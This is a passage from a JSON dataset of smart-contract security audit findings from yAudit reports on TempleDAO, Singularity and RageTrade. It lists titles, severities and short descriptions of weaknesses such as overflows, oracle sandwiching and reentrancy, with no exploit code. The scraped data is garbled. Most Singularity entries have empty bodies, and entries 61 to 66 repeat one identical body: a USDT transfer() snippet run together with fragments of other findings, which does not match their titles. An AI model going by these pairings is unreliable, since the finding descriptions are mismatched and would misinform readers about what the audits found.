        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "2. Enabled borrow tokens configuration is not cleared when shutting down a strategy",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/08-2023-TempleDAO-Lending-Recheck.md",
        "body": "The implementation of the shutdown() function, which is in charge of removing a strategy from the vault, fails to clear the configuration associated with the enabled borrow tokens of a strategy.",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "3. G7 treasuryReservesVault optimization not implemented in DsrBaseStrategy",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/08-2023-TempleDAO-Lending-Recheck.md",
        "body": "The suggestion to cache treasuryReservesVault in DsrBaseStrategy::trvWithdraw() was not applied but is still applicable.",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "4. Change visibility of public constants",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/08-2023-TempleDAO-Lending-Recheck.md",
        "body": "This was originally reported as G-06 in the first audit report. Most of the occurrences have been resolved, except the one in AbstractStrategy.sol. The VERSION constant in ThresholdSafeGuard.sol is also marked as public, although this contract doesn't have a separate getter that publishes the constant, as the others do.",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "5. Avoid copying calldata to memory in addStrategy()",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/08-2023-TempleDAO-Lending-Recheck.md",
        "body": "Line 184 defines a variable in memory that is used to assign each element of the debtCeiling array, which will end up copying the AssetBalance structure from calldata to memory.",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "6. Imprecise comment",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/08-2023-TempleDAO-Lending-Recheck.md",
        "body": "_debtTokenCache(), _getDebtorCache(), and _getBaseCache() are similar functions in different contracts. The NatSpec describing _debtTokenCache() is Update storage if and only if the state has changed. while the NatSpec for _getBaseCache() and _getDebtorCache() is Update storage if and only if the timestamp has changed since last time. In reality, the functions rely on a timestamp if statement check, not specifically a state change check. The timestamp comment is more accurate and can be applied to both functions. Additional alignment between related caching functions is possible. _initDebtTokenCache() checks if blockTs != interestAccumulatorUpdatedAt while _initBaseCache() and _initDebtorCache() checks if _timeElapsed > 0. Aligning the logic in related functions can reduce overall protocol complexity.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "7. Potential overflow in _initDebtorCache()",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/08-2023-TempleDAO-Lending-Recheck.md",
        "body": "In _initDebtorCache() the debtor's principal and current risk premium are added together to calculate the updated risk premium interest. Since the data type of the resulting expression (_debtorTotalDue) is of type uint128 (same as the operands), the calculation may silently overflow due to the usage of unchecked math.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "8. Unchecked statement could overflow",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/08-2023-TempleDAO-Lending-Recheck.md",
        "body": "A summation in _mintDToken() newly moved to an unchecked block could hypothetically overflow. The comment before this line hints that the overflow is checked within the dToken.mint(), but this is incorrect. dToken.mint() does not check for an overflow of _newDebt + dTokenBalance, where dTokenBalance is the sum of principal, baseInterest, and riskPremiumInterest. The closest that dToken.mint() achieves is confirming no overflow in the summation _debtorCache.principal + _mintAmountUInt128, but this summation omits the baseInterest and riskPremiumInterest values that are included in dTokenBalance.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "9. Code without math operations doesn't need unchecked",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/08-2023-TempleDAO-Lending-Recheck.md",
        "body": "Consider moving the line if (_delta > maxTreasuryPriceIndexDelta) revert BreachedMaxTpiDelta(_oldTpi, _newTpi, maxTreasuryPriceIndexDelta) outside of this unchecked block. The same suggestion applies to debtTokenData.totalDebt = _cache.totalDebt = _newDebt; in _repayTotalDebt().",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "10. currentTotalDebt() can be declared external",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/08-2023-TempleDAO-Lending-Recheck.md",
        "body": "currentTotalDebt() is a public function that does not need to be public.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "11. _withdrawFromBaseStrategy() should also revert explicitly if withdrawn amount from base strategy is not enough",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/08-2023-TempleDAO-Lending-Recheck.md",
        "body": "The check and the revert was added in line 624 which only covers the else branch of the conditional present in line 591. If there is a base strategy associated with the debt token, it is possible that this strategy may not have the required funds and could potentially return an amount less than what was requested. In such a scenario, the condition may fail to be correctly checked.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "12. Emit RewardTokensSet event in AuraStaking.sol constructor",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/08-2023-TempleDAO-Lending-Recheck.md",
        "body": "Given the inclusion of the setRewardTokens() function, which now emits the RewardTokensSet event when the reward tokens array is updated, the constructor of the contract should also emit the same event since it performs an assignment of the same array.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "13. Strategy details could output debt ceiling only for enabled tokens",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/08-2023-TempleDAO-Lending-Recheck.md",
        "body": "Both strategyDetails() and strategyBalanceSheet() return information based on all tokens present in the configured set of borrow tokens (i.e. _borrowTokenSet). With the introduction of the enabled borrow tokens feature for each particular strategy, these results could be bound to only the enabled tokens instead of the whole set.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "14. Debt ceiling hook is not triggered when a strategy is added to the vault",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/08-2023-TempleDAO-Lending-Recheck.md",
        "body": "The setStrategyDebtCeiling() function fires the debtCeilingUpdated() callback to signal the strategy that its associated debt ceiling has been updated. The same hook is not triggered in the addStrategy() function, which initializes the debt ceiling value for each of the configured tokens for the strategy. Considering the strategy contract is created before being added to the vault, the strategy might not be aware about the eventual configuration and could potentially require this value during its setup.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "1. Possible locking of pool fee funds",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-Singularity.md",
        "body": "",
        "labels": [
            "yAudit",
            "Severity: High",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "2. Pools mechanics don't incentivize end goal",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-Singularity.md",
        "body": "",
        "labels": [
            "yAudit",
            "Severity: High",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "3. Flashloan/Whale slippage manipulation",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-Singularity.md",
        "body": "",
        "labels": [
            "yAudit",
            "Severity: High",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "4. Single depositor in pool can steal funds from other pools",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-Singularity.md",
        "body": "",
        "labels": [
            "yAudit",
            "Severity: High",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "5. allPrices gas grieving causes complete loss of on-chain oracle",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-Singularity.md",
        "body": "",
        "labels": [
            "yAudit",
            "Severity: High",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "6. Pool drain via Oracle Update Sandwich Attack",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-Singularity.md",
        "body": "",
        "labels": [
            "yAudit",
            "Severity: High",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "7. Incorrect tolerance for price reported by Chainlink Oracle",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-Singularity.md",
        "body": "",
        "labels": [
            "yAudit",
            "Severity: High",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "8. Frozen protocol fee when too many pools are deployed",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-Singularity.md",
        "body": "",
        "labels": [
            "yAudit",
            "Severity: High",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "9. Planned functionality incentivizes low pool liquidity",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-Singularity.md",
        "body": "",
        "labels": [
            "yAudit",
            "Severity: High",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "10. Deposit fees even below 100% CR & withdrawal fees above 100%",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-Singularity.md",
        "body": "",
        "labels": [
            "yAudit",
            "Severity: High",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "11. _getG is not continuous",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-Singularity.md",
        "body": "",
        "labels": [
            "yAudit",
            "Severity: High",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "12. maxPriceTolerance does not work correctly",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-Singularity.md",
        "body": "",
        "labels": [
            "yAudit",
            "Severity: High",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "13. Price updates can be sandwiched",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-Singularity.md",
        "body": "",
        "labels": [
            "yAudit",
            "Severity: High",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "14. Chainlink oracle may return stale data",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-Singularity.md",
        "body": "",
        "labels": [
            "yAudit",
            "Severity: Medium",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "15. Fee-free deposit() and withdraw() can be gamed",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-Singularity.md",
        "body": "",
        "labels": [
            "yAudit",
            "Severity: Medium",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "16. Mechanics increase bank run risk",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-Singularity.md",
        "body": "",
        "labels": [
            "yAudit",
            "Severity: Medium",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "17. Oracle price lag enables 1% arbitrage opportunities",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-Singularity.md",
        "body": "",
        "labels": [
            "yAudit",
            "Severity: Medium",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "18. Slippage calculations are not path independent for large trades",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-Singularity.md",
        "body": "",
        "labels": [
            "yAudit",
            "Severity: Medium",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "19. Reentrancy in SingularityPool.collectFees()",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-Singularity.md",
        "body": "",
        "labels": [
            "yAudit",
            "Severity: Medium",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "20. It can be profitable to split up orders",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-Singularity.md",
        "body": "",
        "labels": [
            "yAudit",
            "Severity: Medium",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "21. _getG exponentiation can overflow for large CR values",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-Singularity.md",
        "body": "",
        "labels": [
            "yAudit",
            "Severity: Medium",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "22. Todo comment indicates necessary change",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-Singularity.md",
        "body": "",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "23. Denial of service edge case if onlyUseChainlink is false",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-Singularity.md",
        "body": "",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "24. No pool existence check",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-Singularity.md",
        "body": "",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "25. Missing zero address check",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-Singularity.md",
        "body": "",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "26. g function discontinuity at 0.3",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-Singularity.md",
        "body": "",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "27. Missing two-step transfer ownership pattern",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-Singularity.md",
        "body": "",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "28. Division before multiplication",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-Singularity.md",
        "body": "",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "29. Deposit cap is inaccurate",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-Singularity.md",
        "body": "",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "30. Use unchecked in SingularityPool.sol",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-Singularity.md",
        "body": "",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "31. Replace modifiers with internal functions",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-Singularity.md",
        "body": "",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "32. Payable functions can save gas",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-Singularity.md",
        "body": "",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "33. Use short require strings",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-Singularity.md",
        "body": "",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "34. Use Solidity errors in 0.8.4+",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-Singularity.md",
        "body": "",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "35. Using simple comparison",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-Singularity.md",
        "body": "",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "36. Using Yul iszero()",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-Singularity.md",
        "body": "",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "37. Replace bool with uint256",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-Singularity.md",
        "body": "",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "38. Declare immutable variables internal when possible",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-Singularity.md",
        "body": "",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "39. Redundant function",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-Singularity.md",
        "body": "",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "40. Remove nonReentrant modifiers",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-Singularity.md",
        "body": "",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "41. Remove feeA > feeB test in getDepositFee()",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-Singularity.md",
        "body": "",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "42. Collateral ratio calculations have redundant SLOADs",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-Singularity.md",
        "body": "",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "43. Replace ProtocolFees state var with Slippage",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-Singularity.md",
        "body": "",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "44. Tight variable packing",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-Singularity.md",
        "body": "",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "45. Use unchecked when there is no risk of overflow or underflow",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-Singularity.md",
        "body": "",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "46. Do not load calldata length in memory for loops",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-Singularity.md",
        "body": "",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "47. Unnecessary named return variable assignment",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-Singularity.md",
        "body": "",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "48. Combine accounting updates in swapIn and swapOut",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-Singularity.md",
        "body": "",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "49. Routers can give infinite token approval to pools",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-Singularity.md",
        "body": "",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "50. Immutable state variable which is defined as a public variable",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-Singularity.md",
        "body": "",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "51. Difference from Uniswap's safeTransferFrom() logic",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-Singularity.md",
        "body": "",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "52. Centralization risk with admin role",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-Singularity.md",
        "body": "",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "53. baseFee value not limited",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-Singularity.md",
        "body": "",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "54. No way to remove pools",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-Singularity.md",
        "body": "",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "55. Fee-on-transfer tokens not supported",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-Singularity.md",
        "body": "",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "56. Documentation inconsistencies",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-Singularity.md",
        "body": "",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "57. Decimals value borrowed from underlying ERC20",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-Singularity.md",
        "body": "",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "58. Typo",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-Singularity.md",
        "body": "",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "59. nonReentrant modifier is specific to each pool",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-Singularity.md",
        "body": "",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "60. Pool may not be able to reach depositCap",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-Singularity.md",
        "body": "",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "61. Incorrect balance accounting for fee-on-transfer and rebasing tokens",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-Singularity.md",
        "body": "USDT has a zero fee on transfer but it can be turned in future, resulting in lower funds in pool. Consider its transfer() function  function transfer(address _to, uint _value) public onlyPayloadSize(2 * 32) { uint fee = (_value.mul(basisPointsRate)).div(10000); if (fee > maximumFee) { fee = maximumFee; } uint sendAmount = _value.sub(fee); balances[msg.sender] = balances[msg.sender].sub(_value); balances[_to] = balances[_to].add(sendAmount); if (fee > 0) { balances[owner] = balances[owner].add(fee); Transfer(msg.sender, owner, fee); } Transfer(msg.sender, _to, sendAmount); } 2. Informational - Reduce footgun risk of deposit() and withdraw() (devtooligan) The dev team has confirmed that the deposit() and withdraw() functions are intentionally \"low-level functions\" that could result in loss if the caller is not careful. While true, we still recommend mitigating the risk of misuse as a kind of public good. The lowest cost way of reducing this risk is through natspec on the functions with a clear warning to callers of the potential pitfalls. Another potential solution to consider that would greatly eliminate this risk would be by adding the minIn / minOut params to the internal swapIn() swapOut() fns, thereby forcing the caller to intentionally pass 0 if they really did not want slippage protection. This would slightly add to the overall runtime gas profile but the difference would be negligible. It costs much less gas to do this than to, for example, call routerOnly which incurs a cold SLOAD. Guest auditors Informational Findings 1. Informational - Code does not match docs",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "62. Reduce footgun risk of deposit() and withdraw()",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-Singularity.md",
        "body": "USDT has a zero fee on transfer but it can be turned in future, resulting in lower funds in pool. Consider its transfer() function  function transfer(address _to, uint _value) public onlyPayloadSize(2 * 32) { uint fee = (_value.mul(basisPointsRate)).div(10000); if (fee > maximumFee) { fee = maximumFee; } uint sendAmount = _value.sub(fee); balances[msg.sender] = balances[msg.sender].sub(_value); balances[_to] = balances[_to].add(sendAmount); if (fee > 0) { balances[owner] = balances[owner].add(fee); Transfer(msg.sender, owner, fee); } Transfer(msg.sender, _to, sendAmount); } 2. Informational - Reduce footgun risk of deposit() and withdraw() (devtooligan) The dev team has confirmed that the deposit() and withdraw() functions are intentionally \"low-level functions\" that could result in loss if the caller is not careful. While true, we still recommend mitigating the risk of misuse as a kind of public good. The lowest cost way of reducing this risk is through natspec on the functions with a clear warning to callers of the potential pitfalls. Another potential solution to consider that would greatly eliminate this risk would be by adding the minIn / minOut params to the internal swapIn() swapOut() fns, thereby forcing the caller to intentionally pass 0 if they really did not want slippage protection. This would slightly add to the overall runtime gas profile but the difference would be negligible. It costs much less gas to do this than to, for example, call routerOnly which incurs a cold SLOAD. Guest auditors Informational Findings 1. Informational - Code does not match docs",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "63. Code does not match docs",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-Singularity.md",
        "body": "USDT has a zero fee on transfer but it can be turned in future, resulting in lower funds in pool. Consider its transfer() function  function transfer(address _to, uint _value) public onlyPayloadSize(2 * 32) { uint fee = (_value.mul(basisPointsRate)).div(10000); if (fee > maximumFee) { fee = maximumFee; } uint sendAmount = _value.sub(fee); balances[msg.sender] = balances[msg.sender].sub(_value); balances[_to] = balances[_to].add(sendAmount); if (fee > 0) { balances[owner] = balances[owner].add(fee); Transfer(msg.sender, owner, fee); } Transfer(msg.sender, _to, sendAmount); } 2. Informational - Reduce footgun risk of deposit() and withdraw() (devtooligan) The dev team has confirmed that the deposit() and withdraw() functions are intentionally \"low-level functions\" that could result in loss if the caller is not careful. While true, we still recommend mitigating the risk of misuse as a kind of public good. The lowest cost way of reducing this risk is through natspec on the functions with a clear warning to callers of the potential pitfalls. Another potential solution to consider that would greatly eliminate this risk would be by adding the minIn / minOut params to the internal swapIn() swapOut() fns, thereby forcing the caller to intentionally pass 0 if they really did not want slippage protection. This would slightly add to the overall runtime gas profile but the difference would be negligible. It costs much less gas to do this than to, for example, call routerOnly which incurs a cold SLOAD. Guest auditors Informational Findings 1. Informational - Code does not match docs",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "64. Just-in-time LP provision can be profitable",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-Singularity.md",
        "body": "USDT has a zero fee on transfer but it can be turned in future, resulting in lower funds in pool. Consider its transfer() function  function transfer(address _to, uint _value) public onlyPayloadSize(2 * 32) { uint fee = (_value.mul(basisPointsRate)).div(10000); if (fee > maximumFee) { fee = maximumFee; } uint sendAmount = _value.sub(fee); balances[msg.sender] = balances[msg.sender].sub(_value); balances[_to] = balances[_to].add(sendAmount); if (fee > 0) { balances[owner] = balances[owner].add(fee); Transfer(msg.sender, owner, fee); } Transfer(msg.sender, _to, sendAmount); } 2. Informational - Reduce footgun risk of deposit() and withdraw() (devtooligan) The dev team has confirmed that the deposit() and withdraw() functions are intentionally \"low-level functions\" that could result in loss if the caller is not careful. While true, we still recommend mitigating the risk of misuse as a kind of public good. The lowest cost way of reducing this risk is through natspec on the functions with a clear warning to callers of the potential pitfalls. Another potential solution to consider that would greatly eliminate this risk would be by adding the minIn / minOut params to the internal swapIn() swapOut() fns, thereby forcing the caller to intentionally pass 0 if they really did not want slippage protection. This would slightly add to the overall runtime gas profile but the difference would be negligible. It costs much less gas to do this than to, for example, call routerOnly which incurs a cold SLOAD. Guest auditors Informational Findings 1. Informational - Code does not match docs",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "65. Potentially misleading description of \"no impermanent loss\"",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-Singularity.md",
        "body": "USDT has a zero fee on transfer but it can be turned in future, resulting in lower funds in pool. Consider its transfer() function  function transfer(address _to, uint _value) public onlyPayloadSize(2 * 32) { uint fee = (_value.mul(basisPointsRate)).div(10000); if (fee > maximumFee) { fee = maximumFee; } uint sendAmount = _value.sub(fee); balances[msg.sender] = balances[msg.sender].sub(_value); balances[_to] = balances[_to].add(sendAmount); if (fee > 0) { balances[owner] = balances[owner].add(fee); Transfer(msg.sender, owner, fee); } Transfer(msg.sender, _to, sendAmount); } 2. Informational - Reduce footgun risk of deposit() and withdraw() (devtooligan) The dev team has confirmed that the deposit() and withdraw() functions are intentionally \"low-level functions\" that could result in loss if the caller is not careful. While true, we still recommend mitigating the risk of misuse as a kind of public good. The lowest cost way of reducing this risk is through natspec on the functions with a clear warning to callers of the potential pitfalls. Another potential solution to consider that would greatly eliminate this risk would be by adding the minIn / minOut params to the internal swapIn() swapOut() fns, thereby forcing the caller to intentionally pass 0 if they really did not want slippage protection. This would slightly add to the overall runtime gas profile but the difference would be negligible. It costs much less gas to do this than to, for example, call routerOnly which incurs a cold SLOAD. Guest auditors Informational Findings 1. Informational - Code does not match docs",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "66. Miscellaneous",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-Singularity.md",
        "body": "USDT has a zero fee on transfer but it can be turned in future, resulting in lower funds in pool. Consider its transfer() function  function transfer(address _to, uint _value) public onlyPayloadSize(2 * 32) { uint fee = (_value.mul(basisPointsRate)).div(10000); if (fee > maximumFee) { fee = maximumFee; } uint sendAmount = _value.sub(fee); balances[msg.sender] = balances[msg.sender].sub(_value); balances[_to] = balances[_to].add(sendAmount); if (fee > 0) { balances[owner] = balances[owner].add(fee); Transfer(msg.sender, owner, fee); } Transfer(msg.sender, _to, sendAmount); } 2. Informational - Reduce footgun risk of deposit() and withdraw() (devtooligan) The dev team has confirmed that the deposit() and withdraw() functions are intentionally \"low-level functions\" that could result in loss if the caller is not careful. While true, we still recommend mitigating the risk of misuse as a kind of public good. The lowest cost way of reducing this risk is through natspec on the functions with a clear warning to callers of the potential pitfalls. Another potential solution to consider that would greatly eliminate this risk would be by adding the minIn / minOut params to the internal swapIn() swapOut() fns, thereby forcing the caller to intentionally pass 0 if they really did not want slippage protection. This would slightly add to the overall runtime gas profile but the difference would be negligible. It costs much less gas to do this than to, for example, call routerOnly which incurs a cold SLOAD. Guest auditors Informational Findings 1. Informational - Code does not match docs",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "1. Incorrect ratios used for delta neutral rebalancing",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-RageTrade.md",
